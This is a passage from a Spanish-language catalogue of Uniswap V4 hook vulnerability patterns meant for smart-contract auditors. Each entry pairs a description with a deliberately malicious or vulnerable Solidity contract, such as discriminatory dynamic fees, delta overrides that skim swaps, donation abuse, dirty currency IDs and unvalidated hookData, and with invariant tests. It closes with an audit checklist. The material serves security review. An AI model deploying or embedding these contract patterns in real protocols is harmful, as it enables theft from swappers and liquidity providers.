    requieren operator check, (3) claims pueden ser transferidos entre
    direcciones, creando mercados secundarios de deuda del PoolManager
    sin las protecciones de un ERC-20 estándar.
  patron_vulnerable: |
    contract ClaimExploitHook is BaseHook {
        function afterSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata,
            BalanceDelta delta,
            bytes calldata
        ) external override returns (bytes4, int128) {
            // El hook mint claims para sí mismo durante el callback
            // Esto NO requiere transferencia de tokens reales
            if (delta.amount0() > 0) {
                // Mint claims que el hook puede usar después
                // para resolver deltas futuros
                poolManager.mint(
                    address(this),
                    key.currency0.toId(),
                    uint256(int256(delta.amount0()))
                );
            }
            return (this.afterSwap.selector, 0);
        }
    }

    // ERC-6909 discrepancia: transfer sin operator check
    contract ClaimTransferExploit {
        function exploit(IPoolManager pm, address victim, uint256 id, uint256 amount) external {
            // Si msg.sender == from, no se verifica operator approval
            // Esto es "by design" pero viola la spec original de ERC-6909
            pm.transfer(victim, id, amount);
        }
    }
  test_invariante: |
    // Invariante: total supply de ERC-6909 claims para una currency
    // no debe exceder el balance real del PoolManager en esa currency
    function invariant_claims_backed_by_reserves() public {
        uint256 totalClaims = poolManager.totalSupply(currency0.toId());
        uint256 actualBalance = currency0.balanceOf(address(poolManager));
        assert(totalClaims <= actualBalance);
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — LOW: ERC-6909 specification discrepancy. Implementación permite transfer donde sender==caller sin operator check. La spec ERC-6909 fue ACTUALIZADA para coincidir con la implementación de Uniswap."
    - "ERC-6909 claims son un mecanismo nuevo sin precedentes en V2/V3 — la superficie de ataque aún no está completamente explorada."
  severidad: high
  confianza: media
  verificado: true
  tags: [ERC-6909, claims, mint, burn, transfer, operator, delta-resolution]
  relacionado_con: [HOOK-04, HOOK-09]
```

### 1.12 Manipulación de Fees Dinámicos por Hook

```yaml
- id: HOOK-12
  pattern: dynamic-fee-manipulation
  titulo: "Hook que manipula fees dinámicos para front-running o extracción de valor"
  descripcion: >
    Hooks que controlan dynamic fees pueden cambiar el fee del pool en cada
    swap individual. Esto crea vectores de ataque sofisticados: (1) el hook
    detecta swaps grandes en el mempool y sube el fee justo antes de que se
    ejecuten, capturando MEV, (2) el hook baja el fee a 0 para swaps de
    direcciones aliadas y lo sube al máximo para otros, creando discriminación
    invisible, (3) el hook usa el fee como mecanismo de sandwich — fee bajo
    para el front-run del atacante, fee alto para la víctima, fee bajo para
    el back-run. La función beforeSwap devuelve (selector, delta, lpFeeOverride)
    donde lpFeeOverride con OVERRIDE_FEE_FLAG reemplaza el fee del pool.
  patron_vulnerable: |
    contract MEVFeeHook is BaseHook {
        address private immutable mevBot;

        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            uint24 fee;

            if (sender == mevBot) {
                // Fee 0 para el bot aliado — front-run y back-run gratis
                fee = 0 | LPFeeLibrary.OVERRIDE_FEE_FLAG;
            } else if (isLargeSwap(params)) {
                // Fee máximo para swaps grandes — extracción máxima
                fee = 999_999 | LPFeeLibrary.OVERRIDE_FEE_FLAG; // ~100%
            } else {
                // Fee normal para no levantar sospechas
                fee = 3000 | LPFeeLibrary.OVERRIDE_FEE_FLAG; // 0.3%
            }

            return (this.beforeSwap.selector, ZERO_DELTA, fee);
        }

        function isLargeSwap(IPoolManager.SwapParams calldata params)
            internal pure returns (bool)
        {
            return params.amountSpecified > 10 ether
                || params.amountSpecified < -10 ether;
        }
    }
  test_invariante: |
    // Invariante: el fee efectivo debe ser consistente para todos los senders
    // en las mismas condiciones de mercado
    function invariant_fee_non_discriminatory() public {
        uint24 feeForUser1 = getEffectiveFee(user1, swapParams);
        uint24 feeForUser2 = getEffectiveFee(user2, swapParams);
        // El fee no debe variar más de 10% entre usuarios diferentes
        // para el mismo swap
        assert(feeForUser1 <= feeForUser2 * 110 / 100);
        assert(feeForUser2 <= feeForUser1 * 110 / 100);
    }
  ejemplo_real:
    - "Uniswap V4 Hooks.sol — beforeSwap retorna uint24 lpFeeOverride. Con OVERRIDE_FEE_FLAG activado, el hook controla completamente el fee por swap. No hay validación de que el fee sea 'razonable' — solo que no exceda MAX_LP_FEE."
    - "Análogo en V3: Uniswap V3 pools tienen fee fijo. V4 rompe esta invariante al permitir fee dinámico por hook, creando una nueva clase de manipulación."
  severidad: high
  confianza: alta
  verificado: true
  tags: [dynamic-fee, hook, MEV, discrimination, lpFeeOverride, sandwich]
  relacionado_con: [HOOK-05, HOOK-01]
```

### 1.13 Reentrancia en Lock/Unlock del PoolManager

```yaml
- id: HOOK-13
  pattern: lock-unlock-reentrancy
  titulo: "Reentrancia lógica en el mecanismo lock/unlock del PoolManager"
  descripcion: >
    El PoolManager.unlock() establece un lock, ejecuta el callback del caller,
    y luego verifica que todos los deltas estén resueltos. Dentro del callback,
    TODAS las operaciones del PoolManager están disponibles (swap, modifyLiquidity,
    donate, initialize). Esto permite reentrancia LEGÍTIMA (operaciones
    compuestas atómicas) pero también reentrancia MALICIOSA. Un hook que
    se ejecuta durante una operación (e.g., afterSwap) puede iniciar una
    nueva operación completa, incluyendo callbacks de otros hooks. El
    modifier onlyWhenUnlocked previene llamadas cuando el pool está locked,
    pero DENTRO de unlock() todo está abierto. La extensión de noDelegateCall
    a todas las funciones externas (fix de OpenZeppelin) mitiga delegatecall
    exploits pero no la reentrancia lógica dentro de unlock().
  patron_vulnerable: |
    // El PoolManager permite llamadas anidadas dentro de unlock()
    contract NestedOperationExploit {
        function unlockCallback(bytes calldata data) external returns (bytes memory) {
            // Operación 1: swap que mueve el precio
            poolManager.swap(poolKeyA, swapParamsLarge, "");

            // Operación 2: el swap de arriba triggerea un hook
            // El hook del pool A, durante afterSwap, hace:
            //   - Otro swap en pool B (usando el precio distorsionado de pool A como oracle)
            //   - Modifica liquidez en pool C
            //   - Dona a pool A para manipular fees acumulados

            // Operación 3: swap inverso para restaurar el precio de A
            poolManager.swap(poolKeyA, reverseSwapParams, "");

            // Resultado: el atacante extrajo valor de pool B usando
            // el precio temporalmente distorsionado de pool A
            return "";
        }
    }
  test_invariante: |
    // Invariante: el estado del pool debe ser consistente antes y después
    // de cada operación atómica dentro de unlock()
    function invariant_consistent_state_per_operation() public {
        // Verificar que no hay operaciones anidadas que explotan
        // estados intermedios inconsistentes
        (uint160 sqrtPrice,,, ) = poolManager.getSlot0(poolId);
        uint128 liquidity = poolManager.getLiquidity(poolId);
        // Después de unlock() completo, el estado debe ser autoconistente
        // El precio debe corresponder a la liquidez disponible
        assert(isConsistentState(sqrtPrice, liquidity));
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — LOW: noDelegateCall solo protegía unlock(). Atacante podía deployar contrato que replica slot logic de PoolManager y delegatecall a funciones no protegidas. RESUELTO: noDelegateCall extendido a TODAS las funciones externas."
    - "V4 design decision: reentrancia dentro de unlock() es PERMITIDA. Esto es fundamentalmente diferente a V2/V3 donde cada operación es atómica e independiente."
  severidad: high
  confianza: alta
  verificado: true
  tags: [reentrancy, lock, unlock, nested-operations, delegatecall, PoolManager]
  relacionado_con: [HOOK-03, HOOK-08]
```

### 1.14 Manipulación de Return Values del Hook (Delta Overrides)

```yaml
- id: HOOK-14
  pattern: hook-return-delta-override
  titulo: "Hook manipula valores de retorno para override deltas del caller"
  descripcion: >
    Los hooks con flags RETURNS_DELTA (bits 3, 2, 1, 0) pueden devolver
    valores que MODIFICAN los deltas del caller. Específicamente:
    - beforeSwap puede devolver BeforeSwapDelta que ajusta el amountToSwap
    - afterSwap puede devolver int128 que se resta del swapDelta
    - afterAddLiquidity/afterRemoveLiquidity devuelven BalanceDelta que se
      resta del callerDelta
    La validación crítica es que beforeSwap NO puede invertir la dirección
    del swap (exactIn a exactOut o viceversa) — si lo intenta, revierte con
    HookDeltaExceedsSwapAmount. Pero dentro de esa restricción, el hook
    tiene libertad para reducir o aumentar los deltas del caller. Un hook
    que devuelve un delta negativo grande en afterAddLiquidity puede hacer
    que el LP pague más de lo que debería. Un hook que devuelve un delta
    positivo grande en afterSwap puede hacer que el swapper reciba menos.
  patron_vulnerable: |
    contract DeltaOverrideHook is BaseHook {
        function afterAddLiquidity(
            address sender,
            PoolKey calldata key,
            IPoolManager.ModifyLiquidityParams calldata params,
            BalanceDelta delta,
            BalanceDelta feesAccrued,
            bytes calldata hookData
        ) external override returns (bytes4, BalanceDelta) {
            // AFTER_ADD_LIQUIDITY_RETURNS_DELTA está activado
            // El hook devuelve un delta que se RESTA del callerDelta
            // callerDelta = callerDelta - hookDelta
            // Si hookDelta es negativo, callerDelta AUMENTA (LP paga más)
            BalanceDelta hookDelta = toBalanceDelta(
                -int128(int256(delta.amount0()) / 10),  // LP paga 10% extra en token0
                -int128(int256(delta.amount1()) / 10)   // LP paga 10% extra en token1
            );
            return (this.afterAddLiquidity.selector, hookDelta);
        }

        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            // beforeSwap puede modificar el amountToSwap
            // Restricción: no puede invertir la dirección (exactIn ↔ exactOut)
            // Pero puede REDUCIR el amount, haciendo que el usuario reciba menos
            int128 specifiedDelta = int128(params.amountSpecified / 5); // Hook "toma" 20%
            BeforeSwapDelta bsd = toBeforeSwapDelta(specifiedDelta, 0);
            return (this.beforeSwap.selector, bsd, 0);
        }
    }
  test_invariante: |
    // Invariante: el delta devuelto por beforeSwap no debe superar un % del swap
    function invariant_beforeswap_delta_bounded() public {
        // Capturar el BeforeSwapDelta devuelto por el hook
        (, BeforeSwapDelta hookDelta,) = hook.beforeSwap(sender, key, params, "");
        int128 specified = hookDelta.getSpecifiedDelta();
        int128 unspecified = hookDelta.getUnspecifiedDelta();
        // El delta del hook no debe exceder el 1% del amountSpecified
        int128 maxDelta = int128(params.amountSpecified / 100);
        assert(abs(specified) <= abs(maxDelta));
    }
  ejemplo_real:
    - "Uniswap V4 Hooks.sol líneas 292-302 — Validación: si beforeSwap invierte la dirección del swap (exactInput a exactOutput), revierte con HookDeltaExceedsSwapAmount. Pero dentro de la dirección correcta, el hook puede tomar hasta 100% del amount."
    - "afterModifyLiquidity: callerDelta = callerDelta - hookDelta. El hook puede aumentar arbitrariamente lo que el caller debe pagar."
    - "Return value validation: todos los hooks deben devolver el selector correcto (32+ bytes). beforeSwap debe devolver exactamente 96 bytes. Violación causa revert."
  severidad: critical
  confianza: alta
  verificado: true
  tags: [hook, delta, return-value, override, beforeSwap, afterSwap, modifyLiquidity]
  relacionado_con: [HOOK-01, HOOK-05]
```

### 1.15 Ataque de Tick Crossing vía Hook

```yaml
- id: HOOK-15
  pattern: tick-crossing-callback-attack
  titulo: "Manipulación de estado durante crossing de ticks concentrados"
  descripcion: >
    En V4 con concentrated liquidity, cuando un swap cruza un tick inicializado,
    la liquidez se actualiza (se agrega o remueve la liquidez de las posiciones
    que empiezan/terminan en ese tick). Un hook en beforeSwap puede manipular
    la liquidez en ticks específicos justo antes del swap, haciendo que el
    swap cruce (o no cruce) ciertos ticks. Esto permite: (1) crear "vacíos"
    de liquidez que amplifican el price impact del usuario, (2) concentrar
    liquidez justo después del tick actual para capturar más fees con menos
    capital, (3) manipular el tickCumulative usado por oráculos TWAP
    integrados. El hook también puede usar donate() para inyectar fees
    en ticks específicos, alterando la distribución de recompensas entre LPs.
  patron_vulnerable: |
    contract TickManipulationHook is BaseHook {
        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            (uint160 sqrtPrice, int24 currentTick,,) = poolManager.getSlot0(key.toId());

            // Remover liquidez de los próximos ticks que el swap va a cruzar
            // Esto amplifica el price impact para el swapper
            if (params.zeroForOne) {
                // El swap va hacia abajo — remover liquidez debajo del tick actual
                poolManager.modifyLiquidity(
                    key,
                    IPoolManager.ModifyLiquidityParams({
                        tickLower: currentTick - 60,
                        tickUpper: currentTick,
                        liquidityDelta: -int256(removableLiquidity),
                        salt: bytes32(0)
                    }),
                    ""
                );
            }
            return (this.beforeSwap.selector, ZERO_DELTA, 0);
        }
    }
  test_invariante: |
    // Invariante: la liquidez total en el rango activo no debe cambiar
    // entre beforeSwap y afterSwap por acción del hook
    function invariant_active_liquidity_stable_during_swap() public {
        uint128 liquidityBefore = poolManager.getLiquidity(poolId);
        // ... execute swap ...
        uint128 liquidityAfter = poolManager.getLiquidity(poolId);
        // La liquidez solo debe cambiar por los ticks que el swap cruzó
        // No por manipulación del hook
        assert(liquidityAfter >= liquidityBefore * 95 / 100); // tolerancia 5%
    }
  ejemplo_real:
    - "V3 análogo: JIT (Just-In-Time) liquidity es un ataque conocido donde MEV bots agregan liquidez justo antes de un swap grande y la retiran inmediatamente después, capturando fees sin riesgo de IL. V4 hooks hacen esto trivial de implementar atómicamente."
    - "V4 permite donate() que inyecta fees directamente en un rango de ticks — esto puede usarse para beneficiar selectivamente a ciertos LPs o manipular incentivos."
  severidad: high
  confianza: media
  verificado: false
  tags: [tick-crossing, concentrated-liquidity, JIT, price-impact, liquidity-manipulation, TWAP]
  relacionado_con: [HOOK-03, HOOK-12]
```

### 1.16 Problemas de Permisos en PositionManager NFT

```yaml
- id: HOOK-16
  pattern: position-manager-nft-permissions
  titulo: "Vulnerabilidades en permisos del PositionManager NFT para posiciones V4"
  descripcion: >
    El PositionManager de V4 periphery representa posiciones de liquidez como
    NFTs ERC-721. El modifier onlyIfApproved verifica que el caller sea owner
    o approved operator del tokenId. Sin embargo, existen vectores de ataque:
    (1) funciones deprecated como _increaseFromDeltas() y _mintFromDeltas()
    son vulnerables a sandwich attacks porque calculan liquidez desde créditos
    actuales sin protección explícita del usuario, (2) el subscriber mechanism
    permite que terceros sean notificados de cambios en posiciones — un
    subscriber malicioso puede explotar la notificación para front-runear,
    (3) modifyLiquiditiesWithoutUnlock() permite operaciones sin el lock
    del PoolManager, potencialmente bypaseando protecciones del hook,
    (4) hookData se pasa directamente al pool sin validación, permitiendo
    que un caller malicioso inyecte datos que el hook interpreta incorrectamente.
  patron_vulnerable: |
    // Función deprecated vulnerable a sandwich
    // (marcada como deprecated en el código fuente de V4 periphery)
    contract PositionManagerExploit {
        function sandwichMintFromDeltas(
            IPositionManager pm,
            PoolKey calldata key,
            int24 tickLower,
            int24 tickUpper,
            bytes calldata hookData
        ) external {
            // _mintFromDeltas calcula liquidez desde créditos actuales
            // sin que el usuario especifique amounts mínimos
            // Un atacante puede:
            // 1. Front-run: mover el precio del pool
            // 2. Víctima: mint con credits al precio distorsionado
            // 3. Back-run: restaurar precio y profit
        }
    }

    // Subscriber malicioso
    contract MaliciousSubscriber is ISubscriber {
        function notifyModifyLiquidity(
            uint256 tokenId,
            int256 liquidityChange,
            BalanceDelta feesAccrued
        ) external {
            // Recibe notificación ANTES de que la modificación se complete
            // Puede front-runear la operación del LP
            if (liquidityChange < 0) {
                // LP está retirando — front-run el retiro
                executeArbitrage();
            }
        }
    }
  test_invariante: |
    // Invariante: solo owner/approved puede modificar posición
    function invariant_position_permission_check() public {
        address owner = positionManager.ownerOf(tokenId);
        address caller = msg.sender;
        bool isApproved = positionManager.isApprovedForAll(owner, caller)
            || positionManager.getApproved(tokenId) == caller;
        // Si caller no es owner ni approved, la operación debe revertir
        if (caller != owner && !isApproved) {
            vm.expectRevert("NotApproved");
            positionManager.modifyLiquidities(data, deadline);
        }
    }
  ejemplo_real:
    - "Uniswap V4 PositionManager — _increaseFromDeltas() y _mintFromDeltas() marcadas como DEPRECATED porque son vulnerables a sandwich attacks. Los usuarios deben usar variantes con amounts explícitos."
    - "PositionManager slippage protection: (liquidityDelta - feesAccrued).validateMaxIn(amount0Max, amount1Max) — fees se deducen del principal antes de validar slippage."
  severidad: medium
  confianza: alta
  verificado: true
  tags: [PositionManager, NFT, ERC-721, permissions, subscriber, sandwich, deprecated]
  relacionado_con: [HOOK-06, HOOK-17]
```

### 1.17 Abuso del Mecanismo de Donación vía Hooks

```yaml
- id: HOOK-17
  pattern: donation-mechanism-abuse
  titulo: "Abuso de donate() por hooks para manipular distribución de fees"
  descripcion: >
    La función donate() de V4 permite inyectar tokens directamente como fees
    en un rango de ticks específico. Un hook con beforeDonate/afterDonate puede:
    (1) redirigir donaciones a rangos donde solo el atacante tiene liquidez,
    (2) usar donate() dentro de beforeSwap para inflar artificialmente los
    fees acumulados en ciertos ticks antes de que un LP retire, (3) crear
    ciclos donate→swap→donate que extraen valor de LPs pasivos. La donación
    es un mecanismo legítimo (para protocol rewards, bribes, etc.) pero
    hooks maliciosos pueden abusar de él para concentrar valor. Además,
    donate() altera los feesAccrued que se pasan a afterAddLiquidity y
    afterRemoveLiquidity, potencialmente afectando la lógica de hooks
    downstream que dependen de estos valores.
  patron_vulnerable: |
    contract DonationAbuse is BaseHook {
        int24 private attackerTickLower;
        int24 private attackerTickUpper;

        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            // Antes de cada swap, donar fees al rango del atacante
            // Los fees se concentran donde el atacante tiene liquidez
            poolManager.donate(
                key,
                1e15,  // Donación de 0.001 token0
                1e15,  // Donación de 0.001 token1
                ""
            );
            return (this.beforeSwap.selector, ZERO_DELTA, 0);
        }

        function afterSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            BalanceDelta delta,
            bytes calldata hookData
        ) external override returns (bytes4, int128) {
            // Después del swap, el atacante tiene fees inflados
            // que puede retirar removiendo su liquidez concentrada
            return (this.afterSwap.selector, 0);
        }
    }
  test_invariante: |
    // Invariante: donate() no debe ser llamado dentro de hooks de swap
    // a menos que el hook esté específicamente diseñado para ello
    function invariant_no_donate_during_swap_hook() public {
        uint256 feesBeforeSwap = getAccumulatedFees(attackerRange);
        // Ejecutar swap
        executeSwap(poolKey, swapParams);
        uint256 feesAfterSwap = getAccumulatedFees(attackerRange);
        // Los fees en el rango del atacante no deben aumentar
        // más que el fee legítimo del swap
        uint256 maxLegitFee = swapAmount * poolFee / 1e6;
        assert(feesAfterSwap - feesBeforeSwap <= maxLegitFee);
    }
  ejemplo_real:
    - "V4 donate() es una función nueva sin precedente en V2/V3. Permite inyección directa de fees en ticks — diseñado para protocol rewards pero sin restricciones de acceso más allá del unlock()."
    - "Análogo: en Curve, bribes a gauges específicos manipulan distribución de rewards. V4 donate() es la versión on-chain y atómica del mismo concepto."
  severidad: medium
  confianza: media
  verificado: false
  tags: [donate, fees, distribution, hook, bribe, tick-range, manipulation]
  relacionado_con: [HOOK-05, HOOK-15]
```

---

## 2. Patrones Avanzados

### 2.1 Unsafe Assembly en Callbacks de Hooks

```yaml
- id: HOOK-18
  pattern: unsafe-assembly-memory-corruption
  titulo: "Bloques assembly inseguros que corrompen memoria durante callbacks de hooks"
  descripcion: >
    Múltiples funciones en Hooks.sol, TickBitmap.sol, Currency.sol, y
    CustomRevert.sol usan bloques assembly marcados como memory-safe que
    violan el modelo de memoria de Solidity. Cuando un hook devuelve datos
    que exceden 64 bytes, el free memory pointer puede ser sobreescrito.
    Error signatures que requieren 96 bytes exceden el scratch space.
    Currency.sol assembly sobreescribe los 4 bytes superiores del free
    memory pointer. Estas corrupciones de memoria pueden causar: (1) datos
    de retorno incorrectos que pasan validaciones, (2) overwrites de
    variables en memoria que alteran el flujo de control, (3) bypasses de
    checks de seguridad cuando la memoria corrupta contiene valores
    inesperados. OpenZeppelin encontró estos issues y fueron resueltos
    removiendo las anotaciones memory-safe.
  patron_vulnerable: |
    // Ejemplo del finding de OpenZeppelin: assembly "memory-safe" que no lo es
    assembly ("memory-safe") {
        // Este bloque reclama ser memory-safe pero viola el modelo
        // Hook return data > 64 bytes sobreescribe free memory pointer

        // En callHook:
        let result := mload(0x40) // free memory pointer
        // Si el hook devuelve > 64 bytes:
        returndatacopy(result, 0, returndatasize())
        // returndatasize() > 64 sobreescribe más allá del scratch space
        // El free memory pointer en 0x40 queda corrupto

        // En CustomRevert.sol:
        // Error signatures necesitan 96 bytes (4 selector + 32 arg1 + 32 arg2 + padding)
        // Pero scratch space solo tiene 64 bytes (0x00-0x3F)
        mstore(0x00, selector)
        mstore(0x04, arg1)
        mstore(0x24, arg2)
        // mstore en 0x24 escribe hasta 0x44 — fuera del scratch space!
    }
  test_invariante: |
    // Test: verificar que hook return data no corrompe memoria
    function check_hook_return_data_safe() public {
        bytes32 fmpBefore;
        assembly { fmpBefore := mload(0x40) }

        // Llamar al hook
        hook.beforeSwap(sender, key, params, "");

        bytes32 fmpAfter;
        assembly { fmpAfter := mload(0x40) }

        // El free memory pointer debe avanzar, nunca retroceder
        assert(uint256(fmpAfter) >= uint256(fmpBefore));
        // Y no debe avanzar demasiado (memory expansion attack)
        assert(uint256(fmpAfter) - uint256(fmpBefore) < 1024);
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — MEDIUM: Unsafe assembly blocks. Múltiples bloques marcados memory-safe violan modelo de memoria de Solidity. Hook return data > 64 bytes corrompe free memory pointer. Error sigs en TickBitmap/CustomRevert exceden scratch space. Currency.sol overrides 4 bytes del FMP. RESUELTO: anotaciones memory-safe removidas."
  severidad: medium
  confianza: alta
  verificado: true
  tags: [assembly, memory-safe, corruption, free-memory-pointer, scratch-space, hooks]
  relacionado_con: [HOOK-01, HOOK-14]
```

### 2.2 Unsafe Casting en Currency ID Conversion

```yaml
- id: HOOK-19
  pattern: unsafe-currency-id-casting
  titulo: "Casting inseguro en conversión Currency↔ID que permite addresses fantasma"
  descripcion: >
    La función Currency.fromId() castea uint256 a address sin enmascarar
    los 12 bytes superiores. Esto significa que fromId(toId(currency)) puede
    NO ser igual a currency si los bytes superiores no son cero. Un atacante
    puede crafted un currencyId con bytes superiores no-cero que, cuando se
    convierte a address vía fromId(), produce una dirección diferente a la
    esperada. Esto puede causar: (1) claims ERC-6909 emitidos con un ID
    que no corresponde a ninguna currency real, (2) confusión en la resolución
    de deltas si se mezclan IDs con y sin upper bytes, (3) bypasses en
    validaciones que comparan currencyId en lugar de address. OpenZeppelin
    encontró este issue y fue resuelto con bit masking.
  patron_vulnerable: |
    // Antes del fix: fromId no limpiaba upper bytes
    library Currency {
        function fromId(uint256 id) internal pure returns (Currency) {
            // VULNERABLE: upper 12 bytes no se limpian
            return Currency.wrap(address(uint160(id)));
            // Si id = 0xFFFF...FFFF0000...address, el uint160 trunca
            // pero el id original tiene bytes que no corresponden
        }

        function toId(Currency currency) internal pure returns (uint256) {
            return uint256(uint160(Currency.unwrap(currency)));
            // toId siempre produce clean ID
            // Pero fromId de un dirty ID produce address válida
            // que NO corresponde al ID original
        }
    }

    // Exploit: mint claims con dirty ID
    contract CurrencyIdExploit {
        function exploit(IPoolManager pm) external {
            // Crear un dirty currency ID
            uint256 dirtyId = uint256(uint160(address(realToken))) | (uint256(1) << 160);

            // Mint claims con dirty ID — crea un "shadow" currency
            pm.mint(address(this), dirtyId, 1000e18);

            // fromId(dirtyId) produce la misma address que fromId(cleanId)
            // Pero son IDs diferentes en el mapping de ERC-6909
        }
    }
  test_invariante: |
    // Invariante: fromId(toId(currency)) == currency para toda currency
    function check_currency_id_roundtrip(address token) public pure {
        Currency c = Currency.wrap(token);
        uint256 id = c.toId();
        Currency roundtripped = Currency.fromId(id);
        assert(Currency.unwrap(roundtripped) == token);
        // Verificar que upper bytes están limpios
        assert(id == uint256(uint160(token)));
        assert(id >> 160 == 0);
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — LOW: Unsafe casting. Currency.fromId() castea uint256 a address sin masking de upper 12 bytes. fromId y toId no son inversas estrictas. RESUELTO: bit masking agregado para limpiar upper bytes."
  severidad: low
  confianza: alta
  verificado: true
  tags: [casting, Currency, fromId, toId, ERC-6909, upper-bytes, identity]
  relacionado_con: [HOOK-11, HOOK-09]
```

### 2.3 Hook Data Injection

```yaml
- id: HOOK-20
  pattern: hook-data-injection
  titulo: "Inyección de datos maliciosos vía hookData pasado sin validación"
  descripcion: >
    Todas las operaciones de V4 aceptan un parámetro bytes calldata hookData
    que se pasa directamente al hook sin ninguna validación por parte del
    PoolManager o PositionManager. El hook interpreta estos datos según
    su propia lógica. Esto crea vectores de inyección: (1) un caller
    malicioso puede pasar hookData que activa funcionalidad oculta del hook
    (e.g., modo admin, bypass de checks), (2) hookData puede contener
    addresses de callback que el hook llama sin verificación, (3) si el
    hook usa abi.decode sin verificar la longitud, hookData malformado
    puede causar out-of-bounds reads o reverts selectivos. Los integradores
    (routers, aggregators) que forwardean hookData del usuario final sin
    sanitización son especialmente vulnerables — un usuario podría crafted
    hookData que explota el hook vía el router.
  patron_vulnerable: |
    // Hook que interpreta hookData como instrucciones de control
    contract HookDataVulnerable is BaseHook {
        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            if (hookData.length > 0) {
                // VULNERABLE: decodifica hookData sin validación
                (uint8 mode, address target, uint256 amount) =
                    abi.decode(hookData, (uint8, address, uint256));

                if (mode == 1) {
                    // Modo "especial" — reduce fee a 0
                    return (this.beforeSwap.selector, ZERO_DELTA, LPFeeLibrary.OVERRIDE_FEE_FLAG);
                } else if (mode == 2) {
                    // Modo "transfer" — el hook envía tokens a target
                    IERC20(Currency.unwrap(key.currency0)).transfer(target, amount);
                }
            }
            return (this.beforeSwap.selector, ZERO_DELTA, 0);
        }
    }

    // Router que forwardea hookData sin sanitizar
    contract VulnerableRouter {
        function swap(
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData  // Viene directo del usuario final
        ) external {
            // Sin validación de hookData — se pasa directo al pool/hook
            poolManager.swap(key, params, hookData);
        }
    }
  test_invariante: |
    // Invariante: hookData no debe poder activar funcionalidad privilegiada
    function invariant_hookdata_no_privilege_escalation() public {
        // Fuzz hookData con datos arbitrarios
        bytes memory maliciousData = abi.encode(uint8(1), attacker, uint256(1e18));
        uint256 hookBalanceBefore = token0.balanceOf(address(hook));
        // Ejecutar swap con hookData malicioso
        poolManager.swap(key, params, maliciousData);
        uint256 hookBalanceAfter = token0.balanceOf(address(hook));
        // El hook no debe transferir tokens basado en hookData de usuario
        assert(hookBalanceAfter <= hookBalanceBefore);
    }
  ejemplo_real:
    - "Uniswap V4 PositionManager — hookData se pasa a poolManager.modifyLiquidity() sin validación. El contrato 'trusts the pool's hook processing' según el código fuente."
    - "Análogo: inyección de calldata en routers de V2/V3 ha causado múltiples exploits donde el router ejecuta calls arbitrarios con tokens approved."
  severidad: high
  confianza: media
  verificado: false
  tags: [hookData, injection, calldata, validation, router, privilege-escalation]
  relacionado_con: [HOOK-01, HOOK-16]
```

---

## 3. Checklist de Auditoría para Hooks V4

### Al auditar un hook de Uniswap V4, verificar:

```
HOOK AUDIT CHECKLIST
═══════════════════

PERMISOS Y TRUST
[ ] ¿La dirección del hook codifica solo los permisos necesarios? (no flags extra)
[ ] ¿Tiene flags RETURNS_DELTA? → auditar cada delta devuelto con lupa
[ ] ¿Es proxy upgradeable? → verificar timelock, governance, multisig del admin
[ ] ¿Quién puede deployar pools con este hook? → ¿cualquiera o solo governance?
[ ] ¿El hook tiene funciones admin/owner? → ¿quién es owner?

CALLBACKS Y REENTRANCIA
[ ] ¿El hook llama a PoolManager dentro de sus callbacks? (reentrancia lógica)
[ ] ¿El hook hace external calls en beforeSwap/afterSwap? → reentrancia
[ ] ¿El hook usa hookData? → ¿lo valida o lo pasa sin sanitizar?
[ ] ¿El hook tiene estado mutable que cambia durante callbacks? → invariantes

DELTA Y FEES
[ ] ¿beforeSwap devuelve BeforeSwapDelta != 0? → ¿cuánto toma del swap?
[ ] ¿afterSwap devuelve int128 != 0? → ¿reduce el output del usuario?
[ ] ¿afterModifyLiquidity devuelve BalanceDelta != 0? → ¿el LP paga extra?
[ ] ¿El hook overridea el fee vía lpFeeOverride? → ¿es predecible/justo?
[ ] ¿El hook usa donate() internamente? → ¿a qué rangos beneficia?

ACCOUNTING Y STATE
[ ] ¿El hook interactúa con ERC-6909 claims? → ¿mint/burn balanceados?
[ ] ¿El hook usa sync/settle? → ¿maneja correctamente native vs ERC-20?
[ ] ¿El hook almacena estado por PoolId? → ¿aislamiento correcto?
[ ] ¿El hook usa transient storage propio? → ¿conflicto con PoolManager?

GAS Y DoS
[ ] ¿El hook tiene loops o calls externos sin gas limit?
[ ] ¿Puede el hook revertir selectivamente para bloquear operaciones?
[ ] ¿El hook retorna datos de tamaño variable? → memory expansion
[ ] ¿El hook puede bloquear liquidaciones o retiros?
```

---

## 4. Invariantes Universales para Pools con Hooks

```solidity
// === INVARIANTES CRÍTICAS PARA AUDITAR POOLS CON HOOKS ===

// INV-HOOK-1: El balance del PoolManager nunca disminuye sin una
// operación legítima (swap, removeLiquidity, take)
assert(
    poolManagerBalance[currency] >= poolManagerBalancePrevious[currency]
    || operationIsLegitimate
);

// INV-HOOK-2: NonzeroDeltaCount DEBE ser 0 al final de unlock()
// (enforced por PoolManager, pero verificar en tests)
assert(poolManager.getNonzeroDeltaCount() == 0);

// INV-HOOK-3: Hook return selectors deben coincidir con la función llamada
// (enforced por Hooks.sol, pero hooks maliciosos pueden intentar bypass)
assert(returnedSelector == expectedSelector);

// INV-HOOK-4: beforeSwap delta no invierte dirección del swap
// (enforced por Hooks.sol HookDeltaExceedsSwapAmount)
assert(exactInput ? amountToSwap <= 0 : amountToSwap >= 0);

// INV-HOOK-5: ERC-6909 claims totales <= balance real del PoolManager
assert(
    poolManager.totalSupply(currencyId) <=
